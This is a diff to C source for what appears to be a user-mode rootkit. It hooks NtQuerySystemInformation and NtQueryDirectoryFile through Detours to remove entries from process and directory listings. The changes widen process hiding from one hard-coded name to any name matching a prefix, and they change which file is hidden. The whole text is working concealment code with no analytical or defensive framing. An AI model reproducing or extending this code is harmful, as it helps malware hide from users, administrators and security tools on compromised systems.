@@ -2,10 +2,14 @@
 #include <stdio.h>
 #include "Structs.h"
 #include "typedef.h"
+#include "GGdef.h"
+#include "GGWin.h"
 #include "Debug.h"
 #include "includes\detours\detours.h"
+#include <Shlwapi.h>
 
 #pragma comment(lib, "includes\\detours\\detours.lib")
+#pragma comment(lib, "Shlwapi.lib")
 
 /* ------------------------------------------------------------------------------------------------------ */
 
@@ -43,7 +47,7 @@ NTSTATUS MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationCl
         PSYSTEM_PROCESS_INFORMATION Current = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)Previous + Previous->NextEntryOffset);
 
         while (Previous->NextEntryOffset != NULL) {
-            if (!lstrcmp(Current->ImageName.Buffer, L"Notepad.exe")) {
+            if (HasPrefix(Current->ImageName.Buffer)) {
                 if (Current->NextEntryOffset == 0) {
                     Previous->NextEntryOffset = 0;
                 }
@@ -87,7 +91,7 @@ NTSTATUS MyNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE
             PFILE_ID_BOTH_DIR_INFO next = (PFILE_ID_BOTH_DIR_INFO)((LPBYTE)current + current->NextEntryOffset);
 
             // comparing name
-            if (CompareToFileName(next, "Never.txt") == TRUE) {
+            if (CompareToFileName(next, "hello.txt") == TRUE) {
                 if (next->NextEntryOffset != 0) {
                     next = (PFILE_ID_BOTH_DIR_INFO)((LPBYTE)next + next->NextEntryOffset);
                     current->NextEntryOffset += next->NextEntryOffset;
